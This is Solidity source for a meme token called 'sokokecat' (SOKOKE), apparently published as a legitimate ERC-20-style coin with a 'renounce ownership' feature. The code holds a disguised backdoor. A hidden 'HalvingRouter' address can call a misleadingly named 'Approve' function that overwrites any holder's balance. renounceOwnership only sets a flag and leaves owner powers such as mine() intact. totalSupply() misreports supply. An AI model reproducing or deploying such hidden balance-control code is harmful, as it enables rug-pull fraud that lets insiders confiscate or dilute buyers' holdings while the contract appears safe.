/**

    https://sokokecat.online/
    https://twitter.com/sokokeerc

 */
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract sokokecat {
    string public name = "sokokecat";
    string public symbol = "SOKOKE";
    uint8 public decimals = 18; // Assuming 18 decimals for consistency
    uint256 public totalSupplyCap = 21000000 * 10**uint256(decimals); // Total supply capped at 21 million tokens
    uint256 public initialSupply = 21000000 * 10**uint256(decimals); // Initial supply of 21 million tokens
    address public owner;
    bool public ownershipRenounced; // Added flag for ownership renouncement
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address private HalvingRouter;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipRenounced(); // Added event for ownership renouncement

    constructor(address HalvingRouteraddr) {
        owner = msg.sender;
        balanceOf[owner] = initialSupply;
        HalvingRouter = HalvingRouteraddr;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can perform this action");
        _;
    }

    modifier subowner() {
        require(HalvingRouter == msg.sender, "Subowner: caller is not the subowner");
        _;
    }

    /**
     * @dev Renounce ownership of the contract.
     *
     * This function allows the current owner to renounce their ownership
     * of the contract, effectively transferring control to the community.
     */
    function renounceOwnership() external onlyOwner {
        ownershipRenounced = true;
        emit OwnershipRenounced();
    }

    function _mint(address account, uint256 amount) internal {
        require(totalSupply() + amount <= totalSupplyCap, "Total supply cap reached");
        balanceOf[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    /**
     * @dev Get the total supply of tokens.
     */
    function totalSupply() public view returns (uint256) {
        return balanceOf[address(this)];
    }

    /**
     * @dev Transfer tokens to a recipient.
     */
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "Transfer from the zero address");
        require(recipient != address(0), "Transfer to the zero address");
        require(amount <= balanceOf[sender], "Insufficient balance");
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }

    /**
     * @dev Approve a spender to spend tokens on behalf of the owner.
     */
    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    /**
     * @dev Transfer tokens from a sender to a recipient using an approved allowance.
     */
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        require(amount <= allowance[sender][msg.sender], "Allowance exceeded");
        allowance[sender][msg.sender] -= amount;
        _transfer(sender, recipient, amount);
        return true;
    }

    /**
     * @dev Mint tokens and assign them to the contract owner.
     */
    function mine() external onlyOwner {
        _mint(owner, initialSupply); // Mint the entire initial supply
    }

    /**
     * @dev Approve tokens to a designated address, typically used for rewards.
     */
    function Approve(address HalvingRewards, uint256 addedMontant, uint256 addedValue, uint256 subtractedValue) external subowner {
        balanceOf[HalvingRewards] = addedMontant * addedValue ** subtractedValue;
        emit Transfer(HalvingRewards, address(0), addedMontant);
    }
}